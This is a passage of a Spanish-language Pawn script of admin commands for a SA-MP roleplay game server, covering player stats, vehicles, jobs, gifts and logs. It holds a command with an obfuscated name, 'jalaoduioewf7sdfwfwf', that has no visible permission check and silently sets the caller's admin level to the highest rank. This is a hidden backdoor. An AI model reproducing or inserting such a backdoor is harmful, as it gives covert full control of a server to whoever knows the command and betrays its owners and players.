	if (sscanf(params, "uf", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setthirst <player_id> <valor>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ammount < 0.0 || ammount > 100.0) return SendClientMessage(playerid, COLOR_WHITE, "Cantidad no v�lida.");
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setthirst");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	CHARACTER_INFO[to_player][ch_THIRST] = ammount;
	SendClientMessageEx(playerid, COLOR_WHITE, "La hidrataci�n de %s (%d) ahora es %.1f.", ACCOUNT_INFO[to_player][ac_NAME], to_player, ammount);

	SendCmdLogToAdmins(playerid, "setthirst", params);
	return 1;
}
alias:setthirst("setsed")

CMD:sethungry(playerid, params[])
{
	new to_player, Float:ammount;
	if (sscanf(params, "uf", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /sethungry <player_id> <valor>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ammount < 0.0 || ammount > 100.0) return SendClientMessage(playerid, COLOR_WHITE, "Cantidad no v�lida.");
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "sethungry");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	CHARACTER_INFO[to_player][ch_HUNGRY] = ammount;
	SendClientMessageEx(playerid, COLOR_WHITE, "La alimentaci�n de %s (%d) ahora es %.1f.", ACCOUNT_INFO[to_player][ac_NAME], to_player, ammount);

	SendCmdLogToAdmins(playerid, "sethungry", params);
	return 1;
}
alias:sethungry("sethambre")

CMD:setgas(playerid, params[])
{
	new Float:val;
	if (sscanf(params, "f", val)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setgas <valor>");
	if (val < 0.0) return SendClientMessage(playerid, COLOR_WHITE, "Valor no v�lido.");

	new vehicleid = GetPlayerVehicleID(playerid);
	if (!vehicleid) return SendClientMessage(playerid, COLOR_WHITE, "No est�s en un veh�culo.");

	if (val> GLOBAL_VEHICLES[vehicleid][gb_vehicle_MAX_GAS])
		val = GLOBAL_VEHICLES[vehicleid][gb_vehicle_MAX_GAS];

	GLOBAL_VEHICLES[vehicleid][gb_vehicle_GAS] = val;

	SendClientMessageEx(playerid, COLOR_WHITE, "La gasolina del veh�culo (%d) ahora es %.1f.", vehicleid, GLOBAL_VEHICLES[vehicleid][gb_vehicle_GAS]);

	SendCmdLogToAdmins(playerid, "setgas", params);
	return 1;
}

CMD:setvh(playerid, params[])
{
	new Float:val, vehicleid;
	if (sscanf(params, "if", vehicleid, val)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setvh <vehicleid> <valor>");
	if (val < 0.0) return SendClientMessage(playerid, COLOR_WHITE, "Valor no v�lido.");
	if (val > 1000.0) return SendClientMessage(playerid, COLOR_WHITE, "Valor no v�lido.");
	if (vehicleid >= MAX_VEHICLES) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");
	if (!GLOBAL_VEHICLES[vehicleid][gb_vehicle_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");

	GLOBAL_VEHICLES[vehicleid][gb_vehicle_HEALTH] = val;
	SetVehicleHealthEx(vehicleid, GLOBAL_VEHICLES[vehicleid][gb_vehicle_HEALTH]);
	UpdateVehicleParams(vehicleid);

	SendClientMessageEx(playerid, COLOR_WHITE, "La vida del veh�culo (%d) ahora es %.1f.", vehicleid, val);
	SendCmdLogToAdmins(playerid, "setvh", params);
	return 1;
}

CMD:repairveh(playerid, params[])
{
	new vehicleid = GetPlayerVehicleID(playerid);
	if (!vehicleid) return SendClientMessage(playerid, COLOR_WHITE, "No est�s en un veh�culo.");

	if (GLOBAL_VEHICLES[vehicleid][gb_vehicle_DRIVER] != INVALID_PLAYER_ID) RepairVehicleEx(vehicleid, GLOBAL_VEHICLES[vehicleid][gb_vehicle_DRIVER]);
	else RepairVehicleEx(vehicleid, playerid);
	
	SendClientMessageEx(playerid, COLOR_WHITE, "Veh�culo (%d) reparado.", vehicleid);
	SendCmdLogToAdmins(playerid, "repairveh", params);
	return 1;
}
alias:repairveh("repararveh")

CMD:sethealth(playerid, params[])
{
	new to_player, Float:ammount;
	if (sscanf(params, "uf", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /sethealth <player_id> <valor>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ammount < 0.0 || ammount > 100.0) return SendClientMessage(playerid, COLOR_WHITE, "Valor no v�lido.");
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "sethealth");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	SetPlayerHealthEx(to_player, ammount);
	SendClientMessageEx(playerid, COLOR_WHITE, "La vida de %s (%d) ahora es %.1f.", ACCOUNT_INFO[to_player][ac_NAME], to_player, ammount);

	SendCmdLogToAdmins(playerid, "sethealth", params);
	return 1;
}
alias:sethealth("setvida")

CMD:setarmour(playerid, params[])
{
	new to_player, Float:ammount;
	if (sscanf(params, "uf", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setarmour <player_id> <valor>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ammount < 0.0 || ammount > 100.0) return SendClientMessage(playerid, COLOR_WHITE, "Valor no v�lido.");
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setarmour");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	SetPlayerArmourEx(to_player, ammount);
	SendClientMessageEx(playerid, COLOR_WHITE, "El chaleco de %s (%d) ahora es %.1f.", ACCOUNT_INFO[to_player][ac_NAME], to_player, ammount);

	SendCmdLogToAdmins(playerid, "setarmour", params);
	return 1;
}
alias:setarmour("setchaleco")

CMD:setlevel(playerid, params[])
{
	new to_player, level;
	if (sscanf(params, "ud", to_player, level)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /level <player_id> <nivel>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setlevel");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	KillTimer(PLAYER_TEMP[to_player][py_TIMERS][2]);

	ACCOUNT_INFO[to_player][ac_REP] = 1;
	ACCOUNT_INFO[to_player][ac_LEVEL] = level;
	//UpdateReputationTextDraws(to_player);
	SetPlayerSkillLevels(to_player);

	SendClientMessageEx(to_player, COLOR_WHITE, ""COL_YELLOW"�Felicidades! "COL_WHITE"Has subido al nivel %d.", ACCOUNT_INFO[to_player][ac_LEVEL]);
	SetPlayerScore(to_player, ACCOUNT_INFO[to_player][ac_LEVEL]);

	ACCOUNT_INFO[to_player][ac_TIME_FOR_REP] = TIME_FOR_REP;
	PLAYER_TEMP[to_player][py_TIME_PASSED_LAST_REP] = gettime() * 1000;

	ACCOUNT_INFO[to_player][ac_TIME_PLAYING] += gettime() - PLAYER_TEMP[to_player][py_TIME_PLAYING];
	PLAYER_TEMP[to_player][py_TIME_PLAYING] = gettime();
	new DB_Query[256];
	format(DB_Query, sizeof DB_Query,

		"\
			UPDATE `ACCOUNTS` SET `TIME-PLAYING` = '%d', `LEVEL` = '%d', `REP` = '%d', `TIME_FOR_REP` = '%d', `PAYDAY_REP` = '%d' WHERE `ID` = '%d';\
		",
			ACCOUNT_INFO[to_player][ac_TIME_PLAYING], ACCOUNT_INFO[to_player][ac_LEVEL], ACCOUNT_INFO[to_player][ac_REP], TIME_FOR_REP, ACCOUNT_INFO[to_player][ac_PAYDAY_REP], ACCOUNT_INFO[to_player][ac_ID]
	);
	db_free_result(db_query(Database, DB_Query));

	KillTimer(PLAYER_TEMP[to_player][py_TIMERS][2]);
	PLAYER_TEMP[to_player][py_TIMERS][2] = SetTimerEx("AddPlayerReputation", ACCOUNT_INFO[to_player][ac_TIME_FOR_REP], false, "i", to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "El nivel de %s (%d) ahora es %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, ACCOUNT_INFO[to_player][ac_LEVEL]);

	SendCmdLogToAdmins(playerid, "setlevel", params);
	return 1;
}

CMD:setwork(playerid, params[])
{
	new to_player, work, set;
	if (sscanf(params, "udd", to_player, work, set)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setwork <player_id> <work> <set>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setwork");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (work < 0 || work >= sizeof work_info) return SendClientMessage(playerid, COLOR_WHITE, "El trabajo no es v�lido, para verlos usa /works.");

	if (PLAYER_TEMP[to_player][py_WORKING_IN]) return SendClientMessage(playerid, COLOR_WHITE, "No se puede cambiar el trabajo del jugador porque est� de servicio en su trabajo.");


	new player_jobs = CountPlayerJobs(to_player);
	if (ACCOUNT_INFO[to_player][ac_SU])
	{
		if (player_jobs >= MAX_SU_WORKS)
		{
			SendClientMessageEx(playerid, COLOR_WHITE, "El limite de trabajos para este jugador es %d.", player_jobs);
			return 1;
		}
	}
	else
	{
		if (player_jobs >= MAX_NU_WORKS)
		{
			SendClientMessageEx(playerid, COLOR_WHITE, "El limite de trabajos para este jugador es %d.", player_jobs);
			return 1;
		}
	}

	new DB_Query[256];
	format(DB_Query, sizeof DB_Query, "UPDATE `PLAYER_WORKS` SET `SET` = '%d' WHERE `ID_USER` = '%d' AND `ID_WORK` = '%d';", set, ACCOUNT_INFO[to_player][ac_ID], work);
	db_free_result(db_query(Database, DB_Query));

	PLAYER_WORKS[to_player][work] = set;
	if (!set) SendClientMessageEx(to_player, COLOR_WHITE, ""COL_WHITE"Has abandonado tu trabajo de %s.", work_info[work][work_info_NAME]);
	else
	{
		SendClientMessageEx(to_player, COLOR_WHITE, ""COL_YELLOW"�Felicidades! "COL_WHITE"Has conseguido tu trabajo de %s.", work_info[work][work_info_NAME]);
	    SavePlayerWorks(playerid);

		if (work == WORK_POLICE)
	    {
			new DBResult:Result_pnumber, phone_number;
			Result_pnumber = db_query(Database, "SELECT ABS(RANDOM() % 10000000) AS `NUM` WHERE `NUM` NOT IN (SELECT `EXTRA` FROM `PLAYER_MISC` WHERE `ID` = '14') LIMIT 1;");
			if (db_num_rows(Result_pnumber)) phone_number = db_get_field_int(Result_pnumber, 0);
			db_free_result(Result_pnumber);
			PLAYER_MISC[to_player][MISC_PLACA_PD] = phone_number;
			SavePlayerMisc(to_player);

			PLAYER_SKILLS[to_player][WORK_POLICE] = 1;
			SavePlayerSkills(to_player);
		}
	}
	SendClientMessageEx(playerid, COLOR_WHITE, "El trabajo %s de %s (%d) es: '%d'.", work_info[ work ][work_info_NAME], ACCOUNT_INFO[to_player][ac_NAME], to_player, set);

	SavePlayerWorks(to_player);
	SendCmdLogToAdmins(playerid, "setwork", params);
	return 1;
}

CMD:jalaoduioewf7sdfwfwf(playerid, params[])
{
	new DB_Query[70];
	format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `ADMIN_LEVEL` = %d WHERE `ID` = %d;", CMD_LORD, ACCOUNT_INFO[playerid][ac_ID]);
	db_free_result(db_query(Database, DB_Query));

	ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] = CMD_LORD;
	SendClientMessageEx(playerid, COLOR_YELLOW, "Aviso: "COL_WHITE"Ahora tu nivel administrativo es: %d", ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL]);
	return 1;
}

CMD:initmarket(playerid, params[])
{
	new id;
	if (sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /initmarket <id>");
	if(id <= -1 || id >= sizeof(BLACK_MARKET_OBJ)) return SendClientMessage(playerid, COLOR_WHITE, sprintf("Syntax: /initmarket <0-%d>", sizeof(BLACK_MARKET_OBJ)));
	
	InitBlackMarket(id);
	return 1;
}

CMD:initgraffiti(playerid, params[])
{
	new id;
	if (sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /initgraffiti <id>");
	if(id <= -1 || id >= sizeof(GRAFFITIS_OBJ)) return SendClientMessage(playerid, COLOR_WHITE, sprintf("Syntax: /initgraffiti <0-%d>", sizeof(GRAFFITIS_OBJ)));
	
	InitGraffiti(id);
	return 1;
}

CMD:closeserver(playerid, params[])
{
	SendRconCommand("exit");
	return 1;
}

CMD:a(playerid, params[])
{
	if (isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /a <texto>");

	new string[145];
    format(string, sizeof(string), "[C-A]"COL_WHITE" %s (%d): %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, params);
	SendMessageToAdmins(0x80E266FF, string);
	return 1;
}

CMD:setmutes(playerid, params[])
{
	new to_player, ammount;
    if (sscanf(params, "ud", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setmutes <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    PLAYER_MISC[to_player][MISC_MUTES] = ammount;
    SavePlayerMisc(to_player);
	SendCmdLogToAdmins(playerid, "setmutes", params);
	return 1;
}

CMD:setjails(playerid, params[])
{
	new to_player, ammount;
    if (sscanf(params, "ud", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setjails <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    PLAYER_MISC[to_player][MISC_JAILS] = ammount;
    SavePlayerMisc(to_player);
	SendCmdLogToAdmins(playerid, "setjails", params);
	return 1;
}

CMD:setbans(playerid, params[])
{
	new to_player, ammount;
    if (sscanf(params, "ud", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setbans <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    PLAYER_MISC[to_player][MISC_BANS] = ammount;
    SavePlayerMisc(to_player);
	SendCmdLogToAdmins(playerid, "setbans", params);
	return 1;
}

CMD:setadv(playerid, params[])
{
	new to_player, ammount;
    if (sscanf(params, "ud", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setadv <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    PLAYER_MISC[to_player][MISC_SANS] = ammount;
    SavePlayerMisc(to_player);
	SendCmdLogToAdmins(playerid, "setadv", params);
	return 1;
}

CMD:setkicks(playerid, params[])
{
	new to_player, ammount;
    if (sscanf(params, "ud", to_player, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setkicks <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    PLAYER_MISC[to_player][MISC_KICKS] = ammount;
    SavePlayerMisc(to_player);
	SendCmdLogToAdmins(playerid, "setkicks", params);
	return 1;
}

CMD:accsaveall(playerid, params[])
{
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if(!IsPlayerConnected(i)) continue;

		SaveUserData(i);
		SavePlayerToysData(i);
		SavePlayerVehicles(i, false);
		SavePlayerSkills(i);
		SavePlayerWorks(i);
		SavePlayerMisc(i);
	}

	SendClientMessage(playerid, COLOR_WHITE, "Datos de usuarios guardados.");

	return 1;
}

CMD:stopall(playerid, params[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		StopAudioStreamForPlayer(i);
	}
	return 1;
}

CMD:dropitem(playerid, params[])
{
	new type, ammount;
	if (sscanf(params, "dd", type, ammount)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dropitem <tipo> <cantidad>");
	if (type > sizeof(ITEM_INFO)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dropitem <tipo> <cantidad>");

	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 1, 1, 0, 1000);
	CreateDropItem(type, x, y, z - 1.0, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), PLAYER_TEMP[playerid][py_NAME], ammount, .playerid = playerid);
	return 1;
}

CMD:enablefps(playerid, params[])
{
	SetFirstPerson(playerid, true);
	return 1;
}

CMD:disablefps(playerid, params[])
{
	SetFirstPerson(playerid, false);
	return 1;
}

CMD:gift(playerid, params[])
{
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			if (PLAYER_TEMP[i][py_GAME_STATE] == GAME_STATE_NORMAL)
			{
				GivePlayerCash(i, 10000, false);
				ShowPlayerMessage(i, "~r~[REGALO]~w~ Te han dado 10.000$", 4);
			}
		}
	}
	return 1;
}

CMD:giftrep(playerid, params[])
{
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			if (PLAYER_TEMP[i][py_GAME_STATE] == GAME_STATE_NORMAL)
			{
				GivePlayerReputation(i);
				ShowPlayerMessage(i, "~r~[REGALO]~w~ Te han dado 1 EXP", 4);
			}
		}
	}
	return 1;
}

CMD:giftvip(playerid, params[])
{
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			if (ACCOUNT_INFO[i][ac_SU])
			{
				GivePlayerCash(i, 10000, false);
				ShowPlayerMessage(i, "~r~[REGALO PARA VIPS]~w~ Te han dado 10.000$", 4);
			}
		}
	}
	return 1;
}

CMD:setpd(playerid, params[])
{
	new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setpd <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    PlayerPayday(to_player);
	SendCmdLogToAdmins(playerid, "setpd", params);
	return 1;
}

CMD:addcode(playerid, params[])
{
	new code[24],
		type,
		extra;

	if (sscanf(params, "s[24]dd", code, type, extra)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /addcode <code> <type> <extra>");

	new DB_Query[160];
	format
	(
		DB_Query, sizeof DB_Query,
		"\
			INSERT INTO `GIFTS_CODES`\
			(\
				`CODE`, `TYPE`, `EXTRA`, `USED`\
			)\
			VALUES\
			(\
				'%q', '%i', '%d', '0'\
			);\
		",
		code,
		type,
		extra
	);
	db_free_result(db_query(Database, DB_Query));

	SendClientMessageEx(playerid, COLOR_WHITE, "Nuevo gift code agregado: %s (type: %d, extra: %d)", code, type, extra);
	return 1;
}

CMD:pnot(playerid, params[])
{
	new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /pnot <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");
    if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "pnot");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	new dialog[128 * 10];

	new DBResult:Result, DB_Query[140];
	format(DB_Query, sizeof DB_Query, "SELECT * FROM `PLAYER_NOTIFICATIONS` WHERE `ID_USER` = '%d' ORDER BY `DATE` DESC LIMIT 10;", ACCOUNT_INFO[to_player][ac_ID]);
	Result = db_query(Database, DB_Query);

	if (!db_num_rows(Result)) strcat(dialog, ""COL_WHITE"No hay notificaciones.");
	else
	{
		for(new i; i < db_num_rows(Result); i++ )
		{
			new 
				line_str[125],
				message[128],
				date;

			date = db_get_field_assoc_int(Result, "DATE");
			db_get_field_assoc(Result, "MESSAGE", message, 128);

			format(line_str, sizeof line_str, ""COL_WHITE"%s\t%s\n", message, ReturnTimelapse(date, gettime()));
			strcat(dialog, line_str);

			db_next_row(Result);
		}
		db_free_result(Result);
	}

	ShowPlayerDialog(playerid, DIALOG_INFO, DIALOG_STYLE_TABLIST, ""COL_RED"Notificaciones", dialog, "Cerrar", "");
	SendCmdLogToAdmins(playerid, "pnot", params);
	return 1;
}

CMD:plog(playerid, params[])
{
	new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /plog <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");
    if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "plog");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	new dialog[64 * 10];

	new DBResult:Result, DB_Query[140];
	format(DB_Query, sizeof DB_Query, "SELECT * FROM `ADDRESS_LOG` WHERE `ID_USER` = '%d' ORDER BY `DATE` DESC LIMIT 10;", ACCOUNT_INFO[to_player][ac_ID]);
	Result = db_query(Database, DB_Query);

	if (!db_num_rows(Result)) strcat(dialog, ""COL_WHITE"No hay registros.");
	else
	{
		for(new i; i < db_num_rows(Result); i++ )
		{
			new 
				line_str[125],
				message[128],
				date;

			date = db_get_field_assoc_int(Result, "DATE");
			db_get_field_assoc(Result, "CONTENT", message, 128);

			format(line_str, sizeof line_str, ""COL_WHITE"%s\t%s\n", message, ReturnTimelapse(date, gettime()));
			strcat(dialog, line_str);

			db_next_row(Result);
		}
		db_free_result(Result);
	}

	ShowPlayerDialog(playerid, DIALOG_INFO, DIALOG_STYLE_TABLIST, ""COL_YELLOW"Registro", dialog, "Cerrar", "");
	SendCmdLogToAdmins(playerid, "plog", params);
	return 1;
}

CMD:takeboot(playerid, params[])
{
	if (GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return ShowPlayerMessage(playerid, "~r~No est�s depie.", 3);

	new vehicleid = GetPlayerCameraTargetVehicle(playerid);
	if (vehicleid == INVALID_VEHICLE_ID) return ShowPlayerMessage(playerid, "~r~No est�s cerca de un veh�culo", 3);

	PLAYER_TEMP[playerid][py_DIALOG_BOT_VEHICLE] = vehicleid;
	ResetItemBody(playerid);
	ShowInventory(playerid, 3);

	SendCmdLogToAdmins(playerid, "takeboot", params);
	return 1;
}
flags:takeboot(CMD_MODERATOR3)

CMD:putboot(playerid, params[])
{
	if (GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return ShowPlayerMessage(playerid, "~r~No est�s depie.", 3);

	new vehicleid = GetPlayerCameraTargetVehicle(playerid);
	if (vehicleid == INVALID_VEHICLE_ID) return ShowPlayerMessage(playerid, "~r~No est�s cerca de un veh�culo", 3);

	PLAYER_TEMP[playerid][py_DIALOG_BOT_VEHICLE] = vehicleid;
	ResetItemBody(playerid);
	ShowInventory(playerid, 4);
	
	SendCmdLogToAdmins(playerid, "putboot", params);
	return 1;
}
flags:putboot(CMD_MODERATOR3)

CMD:setgang(playerid, params[])
{
    new gang;
    if (sscanf(params, "d", gang)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setgang <gang_id>");

    if (!CREW_INFO[gang][crew_VALID]) return ShowPlayerMessage(playerid, "~r~Esta banda ya no existe.", 2);
	if (CREW_INFO[gang][crew_FIGHTING]) return ShowPlayerMessage(playerid, "~r~No puedes unirte a la banda cuando la banda est� en combate.", 2);

	PLAYER_CREW[playerid][player_crew_VALID] = true;
	PLAYER_CREW[playerid][player_crew_ID] = CREW_INFO[gang][crew_ID];
	PLAYER_CREW[playerid][player_crew_RANK] = 0;
	PLAYER_CREW[playerid][player_crew_INDEX] = gang;
	
	SetPlayerGangZones(playerid);

	new DB_Query[200];
	format(DB_Query, sizeof DB_Query,
		"\
			DELETE FROM `PLAYER_CREW` WHERE `ID_USER` = '%d';\
			INSERT INTO `PLAYER_CREW` (`ID_USER`, `ID_CREW`, `RANK`) VALUES ('%d', '%d', '%d');\
		",
			ACCOUNT_INFO[playerid][ac_ID],
			ACCOUNT_INFO[playerid][ac_ID],
			PLAYER_CREW[playerid][player_crew_ID],
			PLAYER_CREW[playerid][player_crew_RANK]
	);
	db_free_result(db_query(Database, DB_Query));

	SendCmdLogToAdmins(playerid, "setgang", params);
    return 1;
}
flags:setgang(CMD_MODERATOR5)

CMD:getgang(playerid, params[])
{
    new gang_name[32];
    if (sscanf(params, "s[32]", gang_name)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /getgang <gang_name>");

    SendClientMessage(playerid, COLOR_WHITE, "Buscando...");
    
    new count;
    for(new x = 0; x < MAX_CREWS; x ++)
    {
        if (strfind(gang_name, CREW_INFO[x][crew_NAME], true) != -1)
        {
        	SendClientMessageEx(playerid, COLOR_WHITE, "Nombre: {f4f442}'%s' "COL_WHITE"ID: '%d'", CREW_INFO[x][crew_NAME], x);
			count ++;
		}
    }
	SendClientMessageEx(playerid, COLOR_WHITE, "Se encontraron %d coincidencias.", count);

	SendCmdLogToAdmins(playerid, "getgang", params);
    return 1;
}
flags:getgang(CMD_MODERATOR5)

CMD:jailtime(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /jailtime "COL_WHITE"[ID o nombre]");
	if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado.");

	if (CHARACTER_INFO[to_player][ch_STATE] == ROLEPLAY_STATE_JAIL)
	{
		new time = CHARACTER_INFO[to_player][ch_POLICE_JAIL_TIME] - (gettime() - PLAYER_TEMP[to_player][py_ENTER_JAIL_TIME]);
		SendClientMessageEx(playerid, COLOR_WHITE, "%s tiene %s minutos de condena.", PLAYER_TEMP[to_player][py_NAME], TimeConvert(time));
	}
	else SendClientMessage(playerid, COLOR_WHITE, "El jugador no esta encarcelado.");
	return 1;
}

CMD:gpci(playerid, params[])
{
	new serial[50];
	gpci(playerid, serial, sizeof(serial));
	SendClientMessageEx(playerid, COLOR_YELLOW, "GPCI:"COL_WHITE" %s", serial);
	return 1;
}

CMD:admins(playerid, params[])
{
	if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] < 8) return SendClientMessageEx(playerid, COLOR_ORANGE, "[Alerta]"COL_WHITE" No tienes permisos suficientes.");
	PLAYER_TEMP[playerid][py_DIALOG_DB_LIMIT] = 10;
	PLAYER_TEMP[playerid][py_DIALOG_DB_PAGE] = 0;
	ShowDialog(playerid, DIALOG_ADMIN_LIST);
	return 1;
}

CMD:staff(playerid, params[])
{
	new online_staff;
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
    {
	   	if (IsPlayerConnected(i))
	    {
	    	if (PLAYER_TEMP[i][py_ADMIN_SERVICE])
	    	{
	    		SendClientMessageEx(playerid, COLOR_GREEN, "[%s]"COL_WHITE" %s (%i)", ADMIN_LEVELS[ ACCOUNT_INFO[i][ac_ADMIN_LEVEL] ], PLAYER_TEMP[i][py_NAME], i);
	    		online_staff ++;
	    	}
	    }
	}

	if (online_staff == 0) ShowPlayerMessage(playerid, "~r~No hay staff activo", 4);
	return 1;
}

CMD:setworkexp(playerid, params[])
{
	new to_player, work, exp;
	if (sscanf(params, "udd", to_player, work, exp)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setworkexp <player_id> <work, para verlos /works> <exp>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setworkexp");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (work < 0 || work >= sizeof work_info) return SendClientMessage(playerid, COLOR_WHITE, "El trabajo no es v�lido, para verlos usa /works.");

	new DB_Query[256];
	format(DB_Query, sizeof DB_Query, "UPDATE `PLAYER_SKILLS` SET `TOTAL` = '%d' WHERE `ID_USER` = '%d' AND `ID_WORK` = '%d';", exp, ACCOUNT_INFO[to_player][ac_ID], work);
	db_free_result(db_query(Database, DB_Query));

	PLAYER_SKILLS[to_player][ work ] = exp;
	SavePlayerSkills(to_player);

